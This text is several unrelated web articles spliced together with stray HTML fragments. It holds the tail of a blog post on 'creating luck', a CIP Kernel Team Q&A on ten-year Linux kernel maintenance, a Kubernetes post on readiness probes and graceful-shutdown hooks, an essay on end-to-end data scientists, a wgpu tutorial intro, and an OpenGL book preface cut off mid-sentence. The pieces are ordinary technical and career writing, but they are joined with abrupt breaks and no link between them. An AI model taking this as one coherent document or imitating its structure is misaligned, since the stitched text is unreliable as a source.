</blockquote> <blockquote> <p>"Richard Feynman was fond of giving the following advice on how to be a genius. You have to keep a dozen of your favorite problems constantly present in your mind, although by and large they will lay in a dormant state. Every time you hear or read a new trick or a new result, test it against each of your twelve problems to see whether it helps. Every once in a while there will be a hit, and people will say: “How did he do it? He must be a genius!”" - <a href="http://themattheweffect.org/tag/richard-feynman/">Gian-Carlo Rota</a></p> </blockquote> </li> <li> <p><strong>🧲 Magnetic Luck</strong>: <em>"Chance IV comes to you, unsought, because of who you are and how you behave."</em> All sources call it "individualized action" but I've renamed it "magnetic luck" to emphasize the end result rather than how you get there. I'm quite familiar with this as <a href="https://www.swyx.io/writing/learning-gears/#miner">the "Miner" gear of my Learning Gears</a> terminology (since updated to 4 gears in <a href="https://learninpublic.org/">my book</a>). This was already a thing pre-Internet, but search and social media have given tremendous reach and influence to the oddballs and obsessives that become the spiritual leaders of every idea and purpose both big and niche.</p> </li> </ol> <p>I find the 4 of these hard to remember, so I've organized them along two axes - <strong>active vs passive</strong>, and <strong>general vs individual</strong>. The first axis is the same realization as "Luck Surface Area" - you actually have the power to do things to create more luck than you were given.</p> <p>The second axis is the insight - that there are forms of luck that apply to everyone, and there are forms of luck that are available only to someone in your unique position. There is a you-shaped hole in the universe and you can either passively occupy it or you can become a beacon for some idea or purpose.</p> </section> <section> <h2 id="habits-and-strategy">Habits and Strategy</h2> <p>I of course find the Four Kinds of Luck very appealing, since I've quoted it so much to friends that I'm writing this post at all. But upon closer reading I think there's a <em>slightly</em> different direction that is unaddressed by the Four Kinds (I originally thought this was embedded in the Four Kinds, only to discover that it wasn't in the source material and I had completely read my own thinking into it).</p> <p> <img alt="Alt Text" src="https://dev-to-uploads.s3.amazonaws.com/i/poue5zg9homy1eo4ml05.png"> </p> <p>This model differs in two ways. It treats both axes as a spectrum rather than a 2x2. It also focuses more on <strong>actions</strong> (you can take) rather than <strong>classification</strong> (which are a little more abstract). I've also swapped out "Active vs Passive" for "Active Habits" and "Individual vs General" for "Good Strategy".</p> <p>I've written about a few of these ideas in prior posts so I won't elaborate:</p> <ul> <li><a href="https://www.swyx.io/writing/marketing-yourself/">Claiming a Domain, Personal Branding</a></li> <li>"Copywork" I wrote about in the "Clone Open Source Apps" chapter of the book</li> </ul> <p>I think <strong>Exploring</strong> and <strong>Prospecting</strong> are worth elaborating here.</p> <p><strong>Exploring</strong> (and to a lesser extent Grinding and Copywork) are <strong>Actively Habitual, non Strategic</strong> activities. But this doesn't mean it is bad. I think this is what you do when you take in general life and career advice and apply them to yourself. You know there are a list of <strong>Principles</strong> which are just generally good things to do in life, and trust that you will do well if you do those things (e.g. <a href="https://www.swyx.io/writing/learn-in-public/">Learn in Public</a>).</p> <p><strong>Prospecting</strong> is a term I've <a href="https://en.wikipedia.org/wiki/Prospecting">borrowed from the oil exploration industry</a>. <strong>Prospecting is a highly Active habit, and highly Strategic.</strong> These days, when you look for oil, there is a whole science to handicapping whether or not a plot of land is likely to have oil. You don't know it for a fact, all you're doing is estimating probabilities. Not to get too tautological, but you will be luckier if you can consistently assess and move towards areas where you are more likely to be "lucky". It might look like luck to others, but the motion and intention you invested to get yourself in a position to be lucky was far from random. I've also written many times about how I think strategic <a href="https://www.google.com/search?&amp;q=swyx.io+%22megatrends%22&amp;oq=swyx.io+%22megatrends%22">manoeuvring for "Megatrends"</a> is a good idea.</p> </section> <section> <h2 id="in-summary">In Summary</h2> <p> <img alt="Alt Text" src="https://dev-to-uploads.s3.amazonaws.com/i/5075sq79y4pstxpp4pdk.png"> </p> <p>This is the state of my thinking on luck right now. That last bit you just read is pretty fresh, I might come back and change this in a couple years when I have refined my thoughts. I welcome any and all feedback.</p> <p>But overall, the message I really want to leave you with is this: <strong>you can create luck</strong>. That's it. I don't care how you do it, what mental model you use, who you quote. I just care <em>that</em> you do it. <strong>Go make yourself more lucky.</strong></p> <blockquote> <p>Ordinarily I'd wish you good luck, but now you have something better than a mere wish 😂</p> </blockquote> </section> <hr>  </div> </main>  </div></div></div>]]>

<h4><em>The Civil Infrastructure Platform has several work groups that ensure things keep running. Below is a Q and A with the CIP Kernel Team.&nbsp;</em></h4>



<h4><strong>1. What is CIP Kernel Team (What does this team work on, what issues does it solve)</strong></h4>



<p>While the CIP project aims to establish an open source base layer (OSBL) of industrial grade software to enable the use and implementation of software building blocks for civil infrastructure, CIP Kernel Team is responsible for Linux kernel in OSBL to sustain industrial grade systems or devices during their life cycles.</p>



<figure><img src="https://lh5.googleusercontent.com/fe5AeUVhO7PWJxM2UZPVieCttQPS0w43QU0VjEZeeT7DZdBXJaeeAv96GegIpavWucZDLnn4y1M-EuuHWHCPxeoIFzMfSCohjbLI4nOlA5vU0mRzvl-l_HKZa99fPnhYx_8X0dOb" alt=""></figure>



<h4><strong>2. What is the primary goal of this team?</strong></h4>



<p>The goal of the team is to provide CIP kernels with more than a ten year maintenance period by fixing versions to fulfill the required level of reliability, sustainability, and security.</p>



<h4><strong>3. What is the development principle of CIP?</strong></h4>



<p>CIP adopts the upstream first as our development principle. The “Upstream First” principle allows patch commits only if those patches are already in the upstream. By following this principle, if a desired patch is not in the upstream yet, this patch should be accepted by the upstream at first. Therefore, it may take time to introduce the desired patch to our project.</p>



<p>But, it enables us to share our outputs with the upstream.&nbsp; At the same time, the risk of conflicts can be eliminated.</p>



<p>CIP is aiming to sustain target systems and devices during their life cycles which are very long by their nature. So the Upstream First principle is essential to achieve our goal.&nbsp;</p>



<figure><img src="https://lh5.googleusercontent.com/FTuEv57sb4x25OHLDFmIjrPpsujBx75lTDzEWqKtZfAh7jd6hbWtV2YfKOtA_lehxcH0GfeXLhYwYfzwBX2dGvUrPwAi0CYaJf-yfGwLlLY1-8zFfbfCM8OL5zJBG1ndhz8kaWHJ" alt=""></figure>



<h4><strong>4. What is “Upstream First” for the Kernel Team?</strong></h4>



<p>For the CIP kernel team, upstreams are Linus mainline and LTS. The team collaborates with upstream projects. Before using their outputs, the team upstreams what the team has and doesn’t keep them locally.&nbsp;</p>



<figure><img src="https://lh6.googleusercontent.com/fBd2bEkTS7ESz8wugA2jGFrOH_I5DcIhDTzRsWuvWQlKL9nMyt-rNJqwCpNci5GPiJKm34vguEz8MVGlUtU_TxQ8YBEym78alWC8dRuoz_hpCeMcri5VarFmLCKq_L4gqcaBxyoP" alt=""></figure>



<p>As marked 1, “Contribution” is our first action. Feature upstreaming is done by CIP member developers. On the other hand, the CIP Kernel Team contributes to upstream in a more general manner. The team developed open source tools in order to work on contributions effectively..</p>



<p>As marked 2, “Use” is the second action. The team uses LTS kernels to release CIP SLTS kernels. For those releases, automated testing plays a very important role. Therefore the&nbsp; CIP kernel team is closely working with the CIP testing team.</p>



<p>As marked 3, “Integrate” is the third action. By integrating those SLTS kernels with CIP Core packages and additional packages, industrial systems or devices can be developed and maintained.</p>



<h4><strong>5. How does the team use LTS kernels?</strong></h4>



<p>The team uses LTS for CIP SLTS kernel bases.&nbsp;</p>



<figure><img loading="lazy" width="1024" height="330" src="https://www.cip-project.org/wp-content/uploads/sites/17/2020/08/Screen-Shot-2020-08-18-at-5.32.16-AM-1024x330.png" alt="" srcset="https://www.cip-project.org/wp-content/uploads/sites/17/2020/08/Screen-Shot-2020-08-18-at-5.32.16-AM-1024x330.png 1024w, https://www.cip-project.org/wp-content/uploads/sites/17/2020/08/Screen-Shot-2020-08-18-at-5.32.16-AM-200x65.png 200w, https://www.cip-project.org/wp-content/uploads/sites/17/2020/08/Screen-Shot-2020-08-18-at-5.32.16-AM-768x248.png 768w, https://www.cip-project.org/wp-content/uploads/sites/17/2020/08/Screen-Shot-2020-08-18-at-5.32.16-AM.png 1296w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>CIP SLTS kernels are based on LTS 4.4 and 4.19. The first releases of SLTS 4.19 and 4.19rt were done in 2019. The team plans to maintain them until 2029 for ten years. The first releases of SLTS 4.4 and 4.4rt were done in 2017, and likewise the team supports them for ten years till 2027.</p>



<p>Both LTS 4.4 and 4.19 are maintained for 6 years by the LTS project. So, the remaining 4 years will be maintained by the CIP Kernel Team.</p>



<figure><img src="https://lh5.googleusercontent.com/vAlgfS_UAjTAwDZpkk6P0GzwpyGS8e6bIljcNqEdqogvIWlHl9dRWyq5iUE2gwZ7FU0APVhbD43AmTaJJGR3erW2PzhSc06-2c0HIa22NoEWv16aMB8zpQN7WdSaREycN50r04NX" alt=""></figure>



<h4><strong>6. How can CIP kernels be used?</strong></h4>



<p>By integrating the SLTS kernels with CIP Core packages and additional packages, industrial systems or devices can be developed.&nbsp;</p>



<p>CIP refers to Debian for userland packages. If you would like to use Debian source packages, you can use Yocto/Poky as a build system.&nbsp;</p>



<p>CIP core packages contain tens of packages which may not be sufficient for the development of end products. So, you can add necessary packages from Debian by writing recipes.</p>



<figure><img src="https://lh6.googleusercontent.com/kS4fbRYqo8H8F6uqIW7AG8NvIoytWhrktJI1ImmHZe0RJe2-igm13JMx_B21YNsKahjDQloBhvgwq26hs6m7LQ5191xLGEuj0z3MEngiU1Bd8lKVfjOlfymMG7ucnMOh94uS6jk_" alt=""></figure>



<h4><strong>7. What has this team accomplished so far?</strong></h4>



<p>Currently SLTS 4.19 is released twice a month and 4.4 is once a month. SLTS 4.19-rt is once a month and 4.4-rt once every two months.</p>



<p>So far the team has steadily released CIP SLTS kernels by following release frequencies below.&nbsp;</p>



<figure><img src="https://lh6.googleusercontent.com/6RCuQ3kVM8YPyMS8VAEca6BvrpOaRatTuvVtrzjK7aZkMXebRPk3HttFO1_C3I5NvNlXQbulBUQRjPVQNya_AfslpvJv0amsLHOQ4mSsHoLkAtNLEecD_mn0qMKxGFcQDqUGNU1D" alt=""></figure>



<p>(as of June 7, 2020)</p>



<h4><strong>8. What are some future goals?</strong></h4>



<p>The team made major releases in 2017 and 2019. So, a major release frequency is once per two years so far. Another two years is going to pass, and Year 2021 is approaching. So, the team started to discuss new SLTS kernels.&nbsp;&nbsp;</p>

            </header>

            <p>There has been a lot of work going on in Core Customer over the last few months to migrate our OIDC/OAuth2 identity service from our tactical container platform to on-premises Kubernetes clusters. I’ve spoken about our homebrew container platform (Corbenetes) before, but here’s the essentials.</p>

<blockquote>
  <p>We built a container platform using Chef and Docker as a stepping stone to Kubernetes. It utilised our existing apps-on-virtual-machines deployment and operational patterns, and so this allowed Software Engineers to develop their applications in a cloud-native manner in a familiar way, and without needing to use the (at the time) brand new Kubernetes platform.</p>

  <p>Now we have a very high level of confidence in said new Kubernetes platform, we are migrating projects over and decommissioning our middle-ground solution.</p>
</blockquote>

<p>The migration actually went a lot smoother than we anticipated, especially seeing as this is the first large-scale service we have built on Kubernetes. One thing we hadn’t initially accounted for was the different ways in which health checks would be used by the underlying platform to detect whether or not traffic should be sent to a specific container. For some context, our current Corbenetes architecture looks similar to the below with one traefik container and two app containers per host (alongside a number of supporting containers for logging and metrics that aren’t shown here).</p>

<p><img src="https://sbg.technology/images/zero-downtime-kubernetes/corbenetes_architecture.png" alt=""></p>

<p>Traefik acts as a proxy, handling both TLS-termination and sending requests to the two backends that are available on the host. The upstream load balancer examines the health endpoints of the applications (via traefik) as well as traefik’s own <code>/ping</code> endpoint. When we do a restart of the application as part of a release, we stop traefik, which allows existing connections to the application to clear down, and takes it out of service in the load balancer so no further requests are sent to this host. Once the applications have finished dealing with their requests, they too are closed down. Because of this, the shutdown of the application itself doesn’t need to be the cleanest, as by the time it receives the shutdown signal there are no requests being served by it.</p>

<p>The following image shows our current architecture now we’re on Kuberbetes, again very high level. We have traefik and app Pods, each exposed with a Service (essentially a cluster of Pods and a policy allowing access to them). The traefik Service is exposed outside the cluster to allow incoming connections from the load balancer, and we make use of the Ingress resource to direct traffic destined for specific URLs to the app backend Service.</p>

<p><img src="https://sbg.technology/images/zero-downtime-kubernetes/kubernetes_architecture.png" alt=""></p>

<h2 id="how-kubernetes-handles-health-checks">How Kubernetes handles health checks</h2>

<p>Our health checks are defined as part of our Deployment manifest, for both traefik and the application. Initially we used the same health check endpoints as we had been using previously. Our manifest looked a little like this.</p>

<h3 id="traefik">traefik</h3>

<div><div><pre><code>livenessProbe:
  failureThreshold: 2
  httpGet:
    path: /ping
    port: 80
    scheme: HTTP
  initialDelaySeconds: 10
  periodSeconds: 5
readinessProbe:
  failureThreshold: 2
  httpGet:
    path: /ping
    port: 80
    scheme: HTTP
  periodSeconds: 5
</code></pre></div></div>

<h3 id="application">application</h3>

<div><div><pre><code>livenessProbe:
  failureThreshold: 2
  httpGet:
    path: /ping
    port: 8081
    scheme: HTTP
  initialDelaySeconds: 10
  periodSeconds: 5
readinessProbe:
  failureThreshold: 2
  httpGet:
    path: /ping
    port: 8081
    scheme: HTTP
  periodSeconds: 5
</code></pre></div></div>

<p>This seemed to work out alright. Our Pods were up and running when we expected them to be, and when we force stopped the application, the health check went bad and the Pod was deleted. It was at this point we started doing extensive performance testing of the application on this new platform. We noticed an issue with cold starts. It appeared that the first time a non-health check request was made to each application Pod, the response time was around <strong>six seconds</strong>. The was obviously a suboptimal situation, and another reason why we do lots of performance testing using production-like load profiles.</p>

<p>After this first slow response, the application was absolutely fine. Turns out that the application doesn’t compile its JavaScript components until the first page load.</p>

<h2 id="its-alive-but-is-it-ready">It’s alive, but is it ready?</h2>

<p>It’s almost as though the team that built Kubernetes knew this would be a thing, as they specifically define both a <code>livenessProbe</code> and a <code>readinessProbe</code> that can be applied to the Pods. Their <a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/">own documentation</a> explains the difference between the two:</p>

<ul>
  <li><strong>livenessProbe</strong> defines when to restart a container, e.g. the <code>/ping</code> endpoint returns a bad response</li>
  <li><strong>readinessProbe</strong> defines when a container is ready to start accepting traffic, e.g. a script has run to synchronise data in your stateful application</li>
</ul>

<p>In our case, we needed to change our <code>readinessProbe</code> to try and load the <code>/login</code> endpoint, and allow the application to be properly ready for accepting <strong>all</strong> traffic, not just health check traffic.</p>

<div><div><pre><code>readinessProbe:
  failureThreshold: 5
  httpGet:
    path: /login?client_id=auth_provider
    port: 8081
  initialDelaySeconds: 25
  periodSeconds: 10
  timeoutSeconds: 1
  successThreshold: 1
</code></pre></div></div>

<p>This was a great success. Each Pod took about 15 seconds longer to start, but that’s a small price to pay to be confident in the ability of the Pod to handle traffic straight away. We went back to our performance testing and low and behold… we still saw issues with dropped requests during an application release, or scale down of the Pods.</p>

<p>Something about how this application works did not appreciate the way in which Kubernetes was terminating it.</p>

<h2 id="let-me-down-gently">Let me down gently</h2>

<p>When Kubernetes decides that it needs to terminate a Pod (whether this be to evacuate a host, move things around for resource utilisation purposes, or just because there is change to the Deployment warranting the creation of new Pods) it sends a <code>SIGTERM</code> (graceful shutdown request) to PID 1 of the container and waits for up to thirty seconds. In our case, PID 1 was the <code>node</code> parent process.</p>

<p>Remember the way we used to stop the applications on Corbenetes? We’d cut them off from receiving new requests and then eventually stop the application itself. Because at a basic level there is no link in Kubernetes between the state of the application Pods, and the state of the traefik Pods, we can’t hide the application behind traefik any more.</p>

<p>Thankfully, we had a way around this. We could use the Kubernetes <a href="https://kubernetes.io/docs/concepts/containers/container-lifecycle-hooks/">container hooks</a> to implement a PreStop hook to do something <em>before</em> Kubernetes attempts to stop the container. We knew that straight killing the <code>node</code> parent was bad, even if it was graceful, so we experimented with the best way to gracefully terminate the container.</p>

<div><div><pre><code>lifecycle:
  preStop:
    exec:
      command: [
        "sh", "-c", "sleep 2 &amp;&amp; kill -15 $(pidof node | awk '{print $1}') &amp;&amp; sleep 2"
      ]
</code></pre></div></div>

<p>We ended up with this PreStop hook, which waits a couple of seconds, then sends a <code>SIGTERM</code> to the <code>node</code> child process, before waiting for another couple of seconds.</p>

<p>We went back to our performance tests and it was smoother than the proverbial. No matter how aggressively we were terminating Pods and restarting Deployments (the quickest way to test a release without actually releasing), we saw absolutely no degradation in service whatsoever.</p>

<p>This was all fine and dandy, but it taught us an important lesson: even if you are moving from one container-based platform to another, there is no such thing as a lift-and-shift. Each of them have their own nuances that need to be addressed. Now we know that Kubernetes is our standard, and we know how to handle zero-downtime deployments for our applications, we can properly spec out work in future, and not spend days chasing our tail trying to work out why it doesn’t just work.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Recently, I came across a <a href="https://www.reddit.com/r/datascience/comments/i48b5q/for_those_that_work_for_a_team_that_has_both_data/" target="_blank">Reddit thread</a> on the different roles in data science and machine learning: data scientist, decision scientist, product data scientist, data engineer, machine learning engineer, machine learning tooling engineer, AI architect, etc.</p>

<p>I found this <em>worrying</em>. It’s difficult to be effective when the data science process (problem framing, data engineering, ML, deployment/maintenance) is split across different people. It leads to coordination overhead, diffusion of responsibility, and lack of a big picture view.</p>

<p>IMHO, <strong>I believe data scientists can be more effective by being end-to-end</strong>. Here, I’ll discuss the <a href="#from-start-identify-the-problem-to-finish-solve-it">benefits</a> and <a href="#but-we-need-specialist-experts-too">counter-arguments</a>, <a href="#the-best-way-to-pick-it-up-is-via-learning-by-doing">how to</a> become end-to-end, and the experiences of <a href="#end-to-end-in-stitch-fix-and-netflix">Stitch Fix and Netflix</a>.</p>

<h2 id="from-start-identify-the-problem-to-finish-solve-it">From start (identify the problem) to finish (solve it)</h2>

<p>You may have come across similar <em>labels</em> and definitions, such as:</p>
<ul>
  <li><a href="https://towardsdatascience.com/why-you-shouldnt-be-a-data-science-generalist-f69ea37cdd2c" target="_blank">Generalist</a>: Focused on roles (<a href="https://en.wikipedia.org/wiki/Product_manager" target="_blank">PM</a>, <a href="https://en.wikipedia.org/wiki/Business_analyst" target="_blank">BA</a>, <a href="https://www.oreilly.com/content/data-engineering-a-quick-and-simple-definition/" target="_blank">DE</a>, <a href="https://en.wikipedia.org/wiki/Category:Data_scientists" target="_blank">DS</a>, <a href="https://www.quora.com/What-exactly-does-a-machine-learning-engineer-do" target="_blank">MLE</a>); some negative connotation</li>

</ul>

<p>I find these definitions to be more prescriptive than I prefer. Instead, I have a simple (and pragmatic) definition: An end-to-end data scientist can <strong>identify and solve problems with data, to deliver value</strong>. To achieve the goal, they’ll wear as many (or as little) hats as required. They’ll also learn and apply whatever tech, methodology, and process that works. Throughout the process, they ask questions such as:</p>
<ul>
  <li>What is the problem? Why is it important?</li>
  <li>Can we solve it? How should we solve it?</li>
  <li>What is the estimated value? What was the actual value?</li>
</ul>

<details><summary>Data Science Processes</summary>
<div>
<p>Another way of defining end-to-end data science is via processes. These processes are usually complex and I’ve left them out of the main discussion. Nonetheless, here are a few in case you’re curious:</p>

<ul>
  <li><a href="https://en.wikipedia.org/wiki/Cross-industry_standard_process_for_data_mining" target="_blank">CRISP-DM</a>: Cross-Industry Standard Process for Data Mining (1997).</li>
  <li><a href="https://en.wikipedia.org/wiki/Data_mining#Process" target="_blank">KDD</a>: Knowledge Discovery in Databases.</li>
  <li><a href="https://docs.microsoft.com/en-us/azure/machine-learning/team-data-science-process/overview" target="_blank">TDSP</a>: Team Data Science Process, proposed by Microsoft in 2018.</li>
  <li><a href="https://github.com/dslp/dslp" target="_blank">DSLP</a>: Data Science Lifecycle Process.</li>
</ul>

<p>Don’t worry if these processes seem heavy and overwhelming. You don’t have to adopt them wholesale—start bit by bit, keep what works and adapt the rest.</p>
</div>

</details>

<h2 id="more-context-faster-iteration-greater-satisfaction">More context, faster iteration, greater satisfaction</h2>

<p>For most data science roles, being more end-to-end improves your ability to make meaningful impact. (Nonetheless, there are <a href="https://nvidia.wd5.myworkdayjobs.com/en-US/NVIDIAExternalCareerSite/job/US-CA-Santa-Clara/Senior-Deep-Learning-Data-Scientist--RAPIDS---AI_JR1929838" target="_blank">roles</a> that focus on machine learning.)</p>

<p><strong>Working end-to-end provides increased context.</strong> While specialized roles can increase efficiency, it reduces context (for the data scientist) and leads to suboptimal solutions.</p>

<blockquote>
  <p>The trick to forgetting the big picture is to look at everything close-up. – Chuck Palahniuk</p>
</blockquote>

<p>It’s hard to design a holistic solution without full context of the upstream problem. Let’s say conversion has decreased and a PM raises a request to improve our search algorithm. However, what’s causing the decrease in the first place? There could be various causes:</p>
<ul>
  <li>Product: Is fraudulent/poor quality product reducing customer trust?</li>
  <li>Data pipelines: Has data quality been compromised or are there delays/outages?</li>
  <li>Model refresh: Is the model not refreshing regularly/correctly?</li>
</ul>

<p>More often than not, the problem—and solution—lies <em>outside</em> of machine learning. A solution to <em>improve the algorithm</em> would miss the root cause.</p>

<p>Similarly, it’s risky to develop a solution without awareness of downstream engineering and product constraints. There’s no point:</p>
<ul>
  <li>Building a near-real time recommender if infra and engineer cannot support it</li>
  <li>Building an infinite scroll recommender if it doesn’t fit in our product and app</li>
</ul>

<p>By working end-to-end, data scientists will have the full context to identify the right problems and develop usable solutions. It can also lead to innovative ideas that specialists, with their narrow context, might miss. Overall, it increases the ability to deliver value.</p>

<p><strong>Communication and coordination overhead is reduced.</strong> With multiple roles comes additional overhead. Let’s look at an example of a data engineer (DE) cleaning the data and creating features, a data scientist (DS) analysing the data and training the model, and a machine learning engineer (MLE) deploying and maintaining it.</p>

<blockquote>
  <p>What one programmer can do in one month, two programmers can do in two months. – Frederick P. Brooks</p>
</blockquote>

<p>The DE and DS need to <em>communicate</em> on what data is (and is not) available, how it should be cleaned (e.g., outliers, normalisation), and which features should be created. Similarly, the DS and MLE have to discuss how to deploy, monitor, and maintain the model, as well as how often it should be refreshed. When issues occur, we’ll need three people in the room (likely with a PM) to triage the root cause and next steps to fix it.</p>

<p>It also leads to additional coordination, where schedules need to be aligned as work is executed and passed along in a sequential approach. If the DS wants to experiment with additional data and features, we’ll need to wait for the DE to ingest the data and create the features. If a new model is ready for A/B testing, we’ll need to wait for the MLE to (convert it to production code) and deploy it.</p>

<p>While the actual development work may take days, the communication back-and-forth and coordination can take weeks, if not longer. With end-to-end data scientists, we can minimize this overhead as well as prevent technical details from being lost in translation.</p>

<p>(But, can an end-to-end DS really do all that? I think so. While the DS might not be as proficient in some tasks as a DE or MLE, they will be able to perform most tasks effectively. If they need help with scaling or hardening, they can always get help from specialist DEs and MLEs.)</p>

<details><summary>The Cost of Communication and Coordination</summary>
<div>
<p>Richard Hackman, a Harvard psychologist, showed that the number of relationships in a team is <code><span>N</span><span>(</span><span>N</span><span>-</span><span>1</span><span>)</span> <span>/</span> <span>2</span></code>, where <code><span>N</span></code> is the number of people. This leads to exponential growth in links, where:</p>

<ul>
  <li>A start-up team of 7 has 21 links to maintain</li>
  <li>A group of 21 (i.e., three start-up teams) has 210 links</li>
  <li>A group of 63 has almost 2,000 links.</li>
</ul>

<p>In our simple example, we only had three roles (i.e., six links). But as a PM, BA, and additional members are included, this leads to greater than linear growth in communication and coordination costs. Thus, while each additional member increases total team productivity, the increased overhead means productivity grows at a decreasing rate. (Amazon’s <a href="https://buffer.com/resources/small-teams-why-startups-often-win-against-google-and-facebook-the-science-behind-why-smaller-teams-get-more-done/" target="_blank">two-pizza teams</a> are a possible solution to this.)</p>
</div>
</details>

<p><strong>Iteration and learning rate is increased.</strong> With greater context and lesser overhead, we can now iterate, fail (read: learn), and deliver value faster.</p>

<p>This is especially important for developing data and algorithmic products. Unlike software engineering (a far more mature craft), we can’t do all the learning and design before we start building—our blueprints, architectures, and design patterns are not as developed. Thus, rapid iteration is essential for the design-build-learn cycle.</p>

<p><strong>There’s greater ownership and accountability.</strong> Having the data science process split across multiple people can lead to diffusion of responsibility, and worse, social loafing.</p>

<p>A common anti-pattern observed is “<a href="https://wiki.c2.com/?ThrownOverTheWall" target="_blank">throw over the wall</a>”. For example, the DE creates features and throws a database table to the DS, the DS trains a model and throws <code>R</code> code over to the MLE, and the MLE translates it to <code>Java</code> to production.</p>

<p>If things get lost-in-translation or if results are unexpected, who is responsible? With a strong culture of ownership, everyone steps up to contribute in their respective roles. But without it, work can degenerate into ass-covering and finger-pointing while the issue persists and customers and the business suffers.</p>

<p>Having the end-to-end data scientist take ownership and responsibility for the entire process can mitigate this. They should be empowered to take action from start to finish, from the customer problem and input (i.e., raw data) to the output (i.e., deployed model) and measurable outcomes.</p>

<details><summary>Diffusion of Responsibilty &amp; Social Loafing</summary>
<div>

<p><a href="https://en.wikipedia.org/wiki/Diffusion_of_responsibility" target="_blank">Diffusion of responsibility</a>: We are less likely to take responsibility and act when there are others present. Individuals feel less responsibility and urgency to help if we know that there are others also watching the situation. </p>

<p>One form of this is the <a href="https://en.wikipedia.org/wiki/Diffusion_of_responsibility#Bystander_effect" target="_blank">Bystander effect</a>, where <a href="https://en.wikipedia.org/wiki/Murder_of_Kitty_Genovese" target="_blank">Kitty Genovese</a> was stabbed outside the apartment building across the street from where she lived. While there were 38 witnesses who saw or heard the attack, none called the police or helped her.</p>

<p><a href="https://en.wikipedia.org/wiki/Social_loafing" target="_blank">Social loafing</a>: We exert less effort when we work in a group vs. working alone. In the 1890s, Ringelmann made people pull on ropes both separately and in groups. He measured how hard they pulled and found that members of a group tended to exert less effort in pulling a rope than did individuals alone.</p>

</div>
</details>

<p><strong>For (some) data scientists, it can lead to increased motivation and job satisfaction</strong>, which is <a href="https://www.clearpointstrategy.com/how-employees-are-motivated-autonomy-mastery-purpose/" target="_blank">closely tied</a> to autonomy, mastery, and purpose.</p>
<ul>
  <li><strong>Autonomy:</strong> By being able to solve problems independently. Instead of waiting and depending on others, end-to-end data scientists are able to identify and define the problem, build their own data pipelines, and deploy and validate a solution.</li>
  <li><strong>Mastery:</strong> In the problem, solution, outcome from end-to-end. They can also pick up the domain and tech as required.</li>
  <li><strong>Purpose</strong>: By being deeply involved in the entire process, they have a more direct connection with the work and outcomes, leading to an increased sense of <em>purpose</em>.</li>
</ul>

<h2 id="but-we-need-specialist-experts-too">But, we need specialist experts too</h2>

<p>Being end-to-end is not for everyone (and every team) though, for reasons such as:</p>

<p><strong>Wanting to specialize</strong> in machine learning, or perhaps a specific niche in machine learning such as neural text generation (read: <a href="https://mc.ai/the-subtle-art-of-priming-gpt-3/" target="_blank">GPT-3 primer</a>). While being end-to-end is valuable, we also need such world-class experts in research and industry who push the envelope. Much of what we have in ML came from academia and pure research efforts.</p>

WebGPU is a specification published by the GPU for the Web Community Group. It aims to allow web code access to GPU functions in a safe and reliable manner. It does this by mimicking the Vulkan API, and translating that down to whatever API the host hardware is using (ie. DirectX, Metal, Vulkan).</p> <p>Wgpu is still in development, so some of this doc is subject to change.</p> <h2 id="why-rust"><a href="#why-rust">#</a> Why Rust?</h2> <p>Wgpu actually has C bindings to allow you to write C/C++ code with it, as well as use other languages that interface with C. That being said, wgpu is written in Rust, and it has some convient Rust Bindings that don't have to jump through any hoops. On top of that, I've been enjoying writing in Rust.</p> <p>You should be fairly familiar with Rust before using this tutorial as I won't go into much detail on Rust syntax. If you're not super comfortable with Rust you can review the <a href="https://www.rust-lang.org/learn" target="_blank" rel="noopener noreferrer">Rust tutorial</a>. You should also be familiar about <a href="https://doc.rust-lang.org/cargo/" target="_blank" rel="noopener noreferrer">Cargo</a>.</p> <p>I'm using this project as a way to learn wgpu myself, so I might miss some important details, or explain things wrong. I'm always open to constructive feedback. That being said, let's get started!</p></div><div><!----> <p><span>Last Updated: </span> <span>11/12/2019, 11:52:09 PM</span></p></div></div>]]>

<p>On the most fundamental level, OpenGL is a software interface that allows a
programmer to communicate with graphics hardware. Of course, there is much more
to it than that, and you will be glad to know that this book explains the finer
details of OpenGL. But before we get our hands dirty and start coding, you'll
need to know a little about the history of Computer Graphics and OpenGL.</p>

<p>In the preface we'll explore the following topics:
* The inception of computers and computer graphics
* What OpenGL is and how it came to be
* How computer graphics work
* Hardware and software requirements for this book</p>

<div>
  <p><strong>Attention:</strong></p><p>
    If you want to get straight into graphics programming without reading this
    lengthy history, you may skip straight to the "requirements" section below,
    read it, and start the next chapter. I have to stress, however, that having
    a thorough understanding of the history of computing, computer graphics,
    and OpenGL can be important in understanding future developments.
  </p>
</div>



<p>Whether through writing, painting, or body language, imaging has always been an
important player in relaying information and chronicling history. The
requirement for visual feedback is so important that it is hard to acknowledge
the existence of something if you cannot see it. Bacteria, for instance, were
purely speculative before their visual discovery in the seventeenth century by
Antonie van Leeuwenhoek who invented the microscope, but became an integral
part of modern science.</p>

<p>Computer data is represented in nothing more than electrical pulses, which are
also invisible to the naked eye. A method of displaying this data had to be
invented, so early computer scientists would get visual feedback from their
machines through a series of lamps mounted onto boards or long perforated paper
tapes, so called "punch cards."</p>

<p>As you can imagine, this information was far from readable and much
interpretation was required to convert the information into a human-readable
format. And even though computers were eventually equipped with electric
typewriters, the output was far from optimal.</p>

<h2>Display: Cathode Ray Tubes</h2>

<p><img src="https://openglbook.com/images/Ferdinand_Braun.jpg" title="Ferdinand Braun, inventor of the Cathode Ray Tube" alt="Ferdinand Braun, inventor of the Cathode Ray Tube"></p>

<p>In 1897, Ferdinand Braun invented the CRT (Cathode Ray Tube) in Germany as a
type of vacuum tube whose purpose was to display an image onto a screen. You
may have seen or used them yourself in the form of glass-tube televisions and
computer monitors that were the norm until very recently.</p>

<p>CRTs were already being used for television and oscilloscope output, but
nobody had thought of combining this technology with computers. The first time
they were used to display computer output was in 1951 at MIT (the Massachusetts
Institute of Technology) where the Whirlwind computer was developed as a United
States Navy flight simulator. CRTs allowed the operators to instantly see the
output of a computer program without having to interpret punch cards, rows of
lamps or sort through reams of printouts.</p>

<p>While the Whirlwind project itself wasn't very successful due to high operating
cost, it was an important step into the direction of computer graphics by
introducing the CRT as a viable computer output device. The CRT became an
important player in the development of computer graphics, and remained the
output device of choice for over 50 years until it was replaced by newer
flat panel technologies.</p>

<h2>The First Interactions</h2>

<p><img src="https://openglbook.com/images/Sutherland_Lightpen-300x220.jpg" title="The light pen used with Sketchpad (Source: 1)" alt="The light pen used with Sketchpad (Source: 1)"></p>

<p>Though CRTs allowed computers to display their output, it was mostly text that
